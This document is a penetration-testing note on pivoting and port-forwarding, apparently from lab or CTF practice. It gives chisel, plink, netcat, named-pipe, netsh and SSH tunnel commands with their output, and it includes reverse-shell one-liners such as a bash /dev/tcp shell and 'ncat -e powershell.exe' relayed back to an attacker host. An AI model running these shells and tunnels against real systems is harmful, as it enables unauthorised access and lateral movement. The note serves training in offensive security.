# Pivoting and port-forwarding

## SOCKS proxy with chisel (reverse tunneling)

Run this on Kali

```text
root@kali:/opt/chisel# ./chisel_1.7.6_linux_amd64 server -p 9001 --reverse
2021/05/17 23:35:31 server: Reverse tunnelling enabled
2021/05/17 23:35:31 server: Fingerprint 80SVlPsLD1xrSqQ6FJcbWN2y3+Fenxt3ivaewz0HtMw=
2021/05/17 23:35:31 server: Listening on http://0.0.0.0:9001
2021/05/17 23:35:59 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Run this on the target

```text
C:\Users\admin\Downloads>chisel_1.7.6_windows_amd64.exe client 192.168.119.170:9001 R:socks
2021/05/17 15:35:57 client: Connecting to ws://192.168.119.170:9001
2021/05/17 15:35:59 client: Connected (Latency 244.9268ms)
```

**/etc/proxychains.conf** setting

```text
root@kali:~/CTF/Box# tail /etc/proxychains.conf
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
#http   127.0.0.1 8080
#socks5 127.0.0.1 22222
socks5 127.0.0.1 1080
```

Note that http proxy in /etc/proxychains.conf [must be disabled](https://security.stackexchange.com/a/106331/190435) or you might get this error

```text
root@kali:~/CTF/Box/PE# proxychains nmap -Pn -n -sTV -p2638,8443-8446,8765,9090 --script=vuln,discovery 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 10:33 +08
Segmentation fault
```

## With plink.exe

Remote port-forward port 9090 back to Kali

```text
C:\Users\Public\Documents>plink32.exe -P 22022 -R 9090:127.0.0.1:9090 root@192.168.119.170
plink32.exe -P 22022 -R 9090:127.0.0.1:9090 root@192.168.119.170
Using username "root".
root@192.168.119.170's password: [pw]

Linux kali 5.3.0-kali2-amd64 #1 SMP Debian 5.3.9-3kali1 (2019-11-20) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed May 19 02:09:43 2021 from 10.11.1.73
root@kali:~#
```

Or using chisel (remote port-forward 445 back to Kali)

```text
root@kali:/opt/LinuxPE# ./chisel_1.7.6_linux_amd64 server -p 9001 --reverse
2021/03/16 23:10:36 server: Reverse tunnelling enabled
2021/03/16 23:10:36 server: Fingerprint Ms42A6rCqfg5jYOw91NOpvF34hO/iJTaYXJ4FBJZExM=
2021/03/16 23:10:36 server: Listening on http://0.0.0.0:9001
2021/03/16 23:10:38 server: session#1: tun: proxy#R:445=>445: Listening

PS C:\Temp> .\chisel_1.7.6_windows_amd64.exe client 10.10.14.78:9001 R:445:127.0.0.1:445
```

To make the forwarded port available all interfaces 0.0.0.0 on Kali so you can visit it on your hypervisor host, make sure these two settings are in **/etc/ssh/sshd_config**

```text
AllowTcpForwarding yes
GatewayPorts yes
```

### Forward traffic back to Kali without opening listener port 

This is used to catch reverse shells with a pivot box and forward back to Kali if there is no direct link between the target and Kali. 

### Linux pivot

Note you need `nc` that supports running commands/programs after connect. ie. `-e` Transfer your nc binary over if necessary.

Kali's IP is 10.10.14.78, Linux pivot is 10.11.1.25 Note the nc within the quotes doesn't need to support `-e`. Also you might need `-k` so the shell doesn't terminate.

```text
root@pivot:/dev/shm# ./nc -nklvp 5555 -c "nc 10.10.14.78 443"
listening on [any] 5555 ...
```

Then any traffic hitting 5555 on the pivot box will hit Kali on 443. For example

```text
root@pivot:~# nc localhost 5555
Testing
```

On Kali

```text
root@kali:~/CTF/Box# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.78] from (UNKNOWN) [10.11.1.25] 24065
Testing
```

This should work similarly for Windows nc64.exe too. 

##### Named pipes method

Ref [here](https://unix.stackexchange.com/questions/293304/using-netcat-for-port-forwarding) and [here](https://www.redhat.com/sysadmin/ncat-port-redirects). Or if you don't want to transfer an nc binary that has `-c` you can use pipes.. On Kali start the listener first

```text
root@kali:~/CTF/PWK/ITDept/thelongnight# nc -nlvp 443
listening on [any] 443 ...
```

On pivot create the pipe file and use it like this

```text
root@pivot:~# mkfifo pipe
root@pivot:~# file pipe
pipe: fifo (named pipe)
root@pivot:~# nc -nlvp 5555 < pipe | nc 10.10.14.78 443 > pipe
Listening on [0.0.0.0] (family 0, port 5555)
```

Then any reverse shell hitting 5555 will get forwarded back to Kali

```text
root@pivot:~# bash -i >& /dev/tcp/127.0.0.1/5555 0>&1

root@kali:~/CTF/Box# nc -nlvp 443
listening on [any] 443 ...
connect to [10.11.14.78] from (UNKNOWN) [10.11.1.25] 13598
root@pivot:~#
```

#### Windows pivot

Ref [here](https://www.onmsft.com/how-to/how-to-configure-port-forwarding-on-a-windows-10-pc). But we can make it work with `netsh`, natively available on Windows. Kali's IP is 192.168.92.150, while Windows is 192.168.92.1

```text
C:\WINDOWS\system32>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=5555 connectaddress=192.168.92.150 connectport=443

C:\WINDOWS\system32>netsh interface portproxy show all

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
0.0.0.0         5555        192.168.92.150  443
```

Testing an incoming reverse shell with nmap for Window's ncat

```text
C:\Users\Ivan>ncat 192.168.92.1 5555 -e powershell.exe
ERROR: Unable to get user claims information.
```

On Kali:

```text
root@kali:~/CTF/PWK/ITDept/thelongnight# nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.92.150] from (UNKNOWN) [192.168.92.1] 18426
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\Ivan>
```

When done, delete the netsh forwarding

```text
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=5555
```

## Dynamic ssh  forwarding with Linux SSH server

```text
root@kali:~/CTF/Box# ssh -p 22000 -f -N -D 1080 john@10.1.1.252
john@10.1.1.252's password:

proxychains nmap -Pn -n -sTV -p745 --script=vuln,discovery 127.0.0.1
```

Specify `-sT` or it won't work.

## SSH to box via jumphost

Let's say you want to get to 10.1.1.1 (which also has an internal IP in the 10.3.3.0/24 subnet), but is accessible only via a pivot box at 10.10.1.251. We can do it with this config. Let's assume we have configured the same private SSH key to work on both the pivot and target.

```text
root@kali:~/CTF/Box# cat config
Host pivot-box
        Hostname 10.10.1.251
        User root
        IdentityFile /root/CTF/Box/id_rsa_pivot
        ControlMaster auto

Host victim
        Hostname 10.1.1.1
        User root
        ProxyJump pivot-box
        IdentityFile /root/CTF/Box/id_rsa_pivot
        ControlMaster auto
```

Here we are using the root user for both boxes. Change accordingly if you don't want root.

```text
root@kali:~/CTF/Box# ssh -F config victim
Linux victim 2.6.31-14-generic #48-Ubuntu SMP Fri Oct 16 14:04:26 UTC 2009 i686

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/

Last login: Fri Jul  2 09:38:35 2021 from 10.1.1.246
root@victim:~# ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:bf:d5:aa
          inet addr:10.3.3.88  Bcast:10.3.3.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:febf:d5aa/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:13277 errors:0 dropped:0 overruns:0 frame:0
          TX packets:149379 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:20011765 (20.0 MB)  TX bytes:10010408 (10.0 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:459 errors:0 dropped:0 overruns:0 frame:0
          TX packets:459 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:43496 (43.4 KB)  TX bytes:43496 (43.4 KB)
```

Note here the SSH user and target is omitted from the command line as it is inside the config file. We can use the same config file to configure dynamic SSH port-forwarding

```text
root@kali:~/CTF/Box# ssh -F config -f -N -D 1080 victim
```

This lets us reach the FTP server on the victim (assuming it has an internal IP of 10.3.3.14)

```text
root@kali:~/CTF/Box# proxychains ftp -p 10.3.3.14
ProxyChains-3.1 (http://proxychains.sf.net)
Connected to 10.3.3.14.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (10.3.3.14:root):
```

